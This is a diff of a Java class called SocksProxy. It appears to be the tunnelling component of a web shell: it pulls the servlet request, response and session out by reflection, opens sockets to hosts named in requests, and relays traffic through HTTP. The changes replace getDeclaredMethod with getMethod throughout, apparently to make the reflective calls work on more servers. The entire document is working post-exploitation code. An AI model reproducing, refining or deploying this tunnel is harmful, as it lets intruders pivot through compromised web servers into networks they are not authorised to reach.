@@ -40,14 +40,14 @@ public class SocksProxy {
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                this.sessionSetAttribute(session, "socket_" + socketHash, socketChannel);
-               response.getClass().getDeclaredMethod("setStatus", Integer.TYPE).invoke(response, 200);
+               response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
             } catch (Exception var10) {
-               Object so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-               Method write = so.getClass().getDeclaredMethod("write", byte[].class);
+               Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+               Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new byte[]{55, 33, 73, 54});
                write.invoke(so, var10.getMessage().getBytes());
-               so.getClass().getDeclaredMethod("flush").invoke(so);
-               so.getClass().getDeclaredMethod("close").invoke(so);
+               so.getClass().getMethod("flush").invoke(so);
+               so.getClass().getMethod("close").invoke(so);
             }
          } else {
             SocketChannel socketChannel;
@@ -68,24 +68,24 @@ public class SocksProxy {
                   try {
                      ByteBuffer buf = ByteBuffer.allocate(512);
                      int bytesRead = socketChannel.read(buf);
-                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
 
-                     for(write = so.getClass().getDeclaredMethod("write", byte[].class, Integer.TYPE, Integer.TYPE); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
+                     for(write = so.getClass().getMethod("write", byte[].class, Integer.TYPE, Integer.TYPE); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
                         write.invoke(so, buf.array(), 0, bytesRead);
-                        so.getClass().getDeclaredMethod("flush").invoke(so);
+                        so.getClass().getMethod("flush").invoke(so);
                         buf.clear();
                      }
 
-                     so.getClass().getDeclaredMethod("flush").invoke(so);
-                     so.getClass().getDeclaredMethod("close").invoke(so);
+                     so.getClass().getMethod("flush").invoke(so);
+                     so.getClass().getMethod("close").invoke(so);
                   } catch (Exception var12) {
-                     response.getClass().getDeclaredMethod("setStatus", Integer.TYPE).invoke(response, 200);
-                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-                     write = so.getClass().getDeclaredMethod("write", byte[].class);
+                     response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
+                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getMethod("write", byte[].class);
                      write.invoke(so, new byte[]{55, 33, 73, 54});
                      write.invoke(so, var12.getMessage().getBytes());
-                     so.getClass().getDeclaredMethod("flush").invoke(so);
-                     so.getClass().getDeclaredMethod("close").invoke(so);
+                     so.getClass().getMethod("flush").invoke(so);
+                     so.getClass().getMethod("close").invoke(so);
                      socketChannel.socket().close();
                   } catch (Error var13) {
                   }
@@ -103,12 +103,12 @@ public class SocksProxy {
                         socketChannel.write(buf);
                      }
                   } catch (Exception var11) {
-                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-                     write = so.getClass().getDeclaredMethod("write", byte[].class);
+                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getMethod("write", byte[].class);
                      write.invoke(so, new byte[]{55, 33, 73, 54});
                      write.invoke(so, var11.getMessage().getBytes());
-                     so.getClass().getDeclaredMethod("flush").invoke(so);
-                     so.getClass().getDeclaredMethod("close").invoke(so);
+                     so.getClass().getMethod("flush").invoke(so);
+                     so.getClass().getMethod("close").invoke(so);
                      socketChannel.socket().close();
                   }
                }
@@ -144,9 +144,9 @@ public class SocksProxy {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
          this.Session = objMap.get("session");
@@ -154,14 +154,14 @@ public class SocksProxy {
          this.Request = objMap.get("request");
       }
 
-      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 
    private Object sessionGetAttribute(Object session, String key) {
       Object result = null;
 
       try {
-         result = session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(session, key);
+         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
       } catch (Exception var5) {
       }
 
@@ -170,7 +170,7 @@ public class SocksProxy {
 
    private void sessionSetAttribute(Object session, String key, Object value) {
       try {
-         session.getClass().getDeclaredMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
       } catch (Exception var5) {
       }
 
@@ -180,7 +180,7 @@ public class SocksProxy {
       Enumeration result = null;
 
       try {
-         result = (Enumeration)session.getClass().getDeclaredMethod("getAttributeNames").invoke(session);
+         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
       } catch (Exception var4) {
       }
 
@@ -189,7 +189,7 @@ public class SocksProxy {
 
    private void sessionRemoveAttribute(Object session, String key) {
       try {
-         session.getClass().getDeclaredMethod("removeAttribute").invoke(session, key);
+         session.getClass().getMethod("removeAttribute").invoke(session, key);
       } catch (Exception var4) {
       }
 
